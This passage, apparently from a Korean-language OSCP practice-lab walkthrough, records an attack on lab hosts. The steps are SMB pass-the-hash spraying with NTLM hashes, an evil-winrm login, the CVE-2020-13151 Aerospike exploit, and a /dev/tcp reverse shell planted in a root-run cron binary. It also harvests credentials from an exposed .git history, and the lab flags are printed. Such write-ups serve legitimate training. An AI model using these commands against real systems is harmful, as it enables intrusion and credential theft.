SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\tom_admin:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
```

tom_admin 접속 성공
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ evil-winrm -i 10.10.157.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users> cd c:\users\administrator\desktop
*Evil-WinRM* PS C:\Users\administrator\desktop> type proof.txt
39b08bde098edb2857a1f89fe13fe0db
```

https://www.exploit-db.com/exploits/49067
https://github.com/b4ny4n/CVE-2020-13151


CVE 활용하여 쉘 획득
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A/CVE-2020-13151]
└─$ python cve2020-13151.py --ahost 192.168.157.143 --netcatshell --lhost=192.168.45.169 --lport=3000
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote XJOyrOOWpoZwmUoC
[+] registering udf
[+] sending payload, make sure you have a listener on 192.168.45.169:3000.....

```

```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ rlwrap nc -lnvp 3000
listening on [any] 3000 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.157.143] 44788
/bin/sh: 0: can''t access tty; job control turned off
$ whoami
aero
```

pspy64 사용하여 `/opt/aerospike/bin/asadm` 이 실행되는 것을 확인
```bash
$ ./pspy64
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
ERROR: parsing events: possible inotify event overflow
done
2026/08/13 03:50:51 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity
2026/08/13 03:50:57 CMD: UID=0    PID=20103  |
2026/08/13 03:51:01 CMD: UID=0    PID=20109  | grep -q timed out
2026/08/13 03:51:01 CMD: UID=0    PID=20108  | python /bin/asinfo -v STATUS
2026/08/13 03:51:01 CMD: UID=0    PID=20107  | /bin/bash /root/aerospike.sh
2026/08/13 03:51:01 CMD: UID=0    PID=20106  | /bin/sh -c /root/aerospike.sh
2026/08/13 03:51:01 CMD: UID=0    PID=20105  | /usr/sbin/CRON -f
2026/08/13 03:51:01 CMD: UID=0    PID=20110  | python /bin/asinfo -v STATUS
2026/08/13 03:51:01 CMD: UID=0    PID=20111  | python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS'
2026/08/13 03:51:01 CMD: UID=0    PID=20112  | /bin/sh /sbin/ldconfig -p
2026/08/13 03:51:04 CMD: UID=0    PID=20132  | /lib/systemd/systemd-udevd
```

asadm 파일 확인
```bash
$ ls -al /opt/aerospike/bin/asadm
-rwxr-xr-x 1 aero aero 6723733 Dec  7  2019 /opt/aerospike/bin/asadm
```

```bash
aero@oscp:/$ echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.169/443 0>&1'" > /opt/aerospike/bin/asadm
```

root 확보 후 flag 확인
```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.157.143] 47748
bash: cannot set terminal process group (20715): Inappropriate ioctl for device
bash: no job control in this shell
root@lab-pwk2-student-cl4-143-ubuntu20-aero-246-107:/# whoami
whoami
root
root@lab-pwk2-student-cl4-143-ubuntu20-aero-246-107:/# cat /root/proof.txt
cat /root/proof.txt
d8c9ba75fe48dc73243631f9266b4774

root@lab-pwk2-student-cl4-143-ubuntu20-aero-246-107:/# cat /home/aero/local.txt
<3-ubuntu20-aero-246-107:/# cat /home/aero/local.txt
bf73d64f2fc1c90060989e4a23196a9f
```

## 192.168.157.144
Nmap에서 .git 존재 확인
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ cat nmap_144.log
# Nmap 7.98 scan initiated Wed Aug 12 14:29:50 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.144.144
Nmap scan report for 192.168.144.144
Host is up (0.084s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:55:a5:65:ad:8d:66:b0:7d:a5:6e:ee:10:c5:9b:73 (ECDSA)
|_  256 b7:e3:e2:bc:4d:d5:31:63:6d:bb:3c:4b:34:c5:12:d0 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Home
|_http-generator: Nicepage 4.21.12, nicepage.com
| http-git:
|   192.168.144.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update
|     Remotes:
|_      https://ghp_REDACTED_PAT@github.com/PWK-Challenge-Lab/dev.git
```

192.168.157.144 git 확보
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ wget -r http://192.168.157.144/.git/                                                              --2026-08-13 13:03:45--  http://192.168.157.144/.git/
Connecting to 192.168.157.144:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4068 (4.0K) [text/html]
Saving to: ‘192.168.157.144/.git/index.html’

192.168.157.144/.git/inde 100%[===================================>]   3.97K  --.-KB/s    in 0s

2026-08-13 13:03:45 (114 MB/s) - ‘192.168.157.144/.git/index.html’ saved [4068/4068]
<SNIP>
```

```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ ls
192.168.157.144  GodPotato-NET4.exe  ID            nmap_143.log  nmap.log  SYSTEM
agent.exe        hash_142.txt        nc64.exe      nmap_144.log  pspy64    users_142.txt
CVE-2020-13151   hash.txt            nmap_141.log  nmap_145.log  SAM       users.txt

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ cd 192.168.157.144

┌──(kali㉿kali)-[~/PG/OSCP_A/192.168.157.144]
└─$ ls
Home.css  Home.html  icons  images  index.html  jquery.js  nicepage.css  nicepage.js

┌──(kali㉿kali)-[~/PG/OSCP_A/192.168.157.144]
└─$ ls -al
total 1772
drwxrwxr-x  5 kali kali    4096 Aug 13 13:03 .
drwxrwxr-x  4 kali kali    4096 Aug 13 13:03 ..
drwxrwxr-x 11 kali kali    4096 Aug 13 13:03 .git
-rw-rw-r--  1 kali kali   50917 Nov 22  2022 Home.css
-rw-rw-r--  1 kali kali   46103 Nov 22  2022 Home.html
drwxrwxr-x  2 kali kali    4096 Aug 13 13:03 icons
drwxrwxr-x  2 kali kali    4096 Aug 13 13:03 images
-rw-rw-r--  1 kali kali   46103 Nov 22  2022 index.html
-rw-rw-r--  1 kali kali   89476 Nov 22  2022 jquery.js
-rw-rw-r--  1 kali kali 1299887 Nov 22  2022 nicepage.css
-rw-rw-r--  1 kali kali  246601 Nov 22  2022 nicepage.js

┌──(kali㉿kali)-[~/PG/OSCP_A/192.168.157.144]
└─$ cd .git

┌──(kali㉿kali)-[~/PG/OSCP_A/192.168.157.144/.git]
└─$ git log
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:56:19 2022 +0200

    Delete database.php

commit eda55ed6455d29532295684e3900cda74d695067
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:40 2022 +0200

    Create robots.txt
```

git commit 정보 내 자격증명 확인
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A/192.168.157.144]
└─$ git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;

```


확보한 자격증명으로 SSH 접근 후 flag 확보
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A/192.168.157.144]
└─$ ssh stuart@192.168.157.144
The authenticity of host '192.168.157.144 (192.168.157.144)' can't be established.
ED25519 key fingerprint is: SHA256:Eq0fkdkdY1eu0hx1aTPThjjzZAJDykAgnxq3n+E0ngA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.157.144' (ED25519) to the list of known hosts.
stuart@192.168.157.144's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 13 04:15:09 AM UTC 2026

  System load:  0.0                Processes:             98
  Usage of /:   43.0% of 18.53GB   Users logged in:       0
  Memory usage: 11%                IPv4 address for ens3: 192.168.157.144
  Swap usage:   0%


123 updates can be applied immediately.
6 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


*** System restart required ***
Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
stuart@lab-pwk2-student-cl4-144-ubuntu2204-crystal-246-107:~$ cat local.txt
002baefc0fc628a4db850556c2a8110c
```

